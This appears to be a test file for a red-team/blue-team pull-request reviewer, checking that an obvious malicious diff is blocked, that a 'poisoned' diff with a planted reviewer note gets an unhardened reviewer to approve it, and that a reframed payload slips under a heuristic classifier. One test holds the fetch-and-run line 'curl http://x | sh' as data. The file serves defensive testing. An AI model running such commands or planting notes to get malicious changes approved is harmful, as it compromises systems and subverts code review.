from devsecops_agents.blue_reviewer.review import RulesEngine, apply_rules, heuristic_scorer
from devsecops_agents.red_attacker.payloads import ATTACK_PRS

OBVIOUS = ATTACK_PRS["pr-01-obvious.diff"]
POISONED = ATTACK_PRS["pr-02-poisoned.diff"]


def test_obvious_pr_is_blocked():
    result = RulesEngine().review(OBVIOUS.pr_id, OBVIOUS.diff)
    assert result.decision == "BLOCK"
    assert {h.rule for h in result.rule_hits} >= {"remote-exec", "ci-step-change"}


def test_poisoned_pr_fools_the_vulnerable_reviewer():
    result = RulesEngine(hardened=False).review(POISONED.pr_id, POISONED.diff)
    assert result.decision == "APPROVE"
    assert result.reviewer_note_honored


def test_hardened_reviewer_contains_the_attack():
    result = RulesEngine(hardened=True).review(POISONED.pr_id, POISONED.diff)
    assert result.decision == "BLOCK"
    assert result.reviewer_note_detected and not result.reviewer_note_honored


def test_reframed_payload_evades_the_classifier():
    assert heuristic_scorer(POISONED.diff) < 0.5 < heuristic_scorer("decode this morse")


def test_rules_only_look_at_added_lines():
    assert apply_rules("-script: curl http://x | sh\n context line") == []
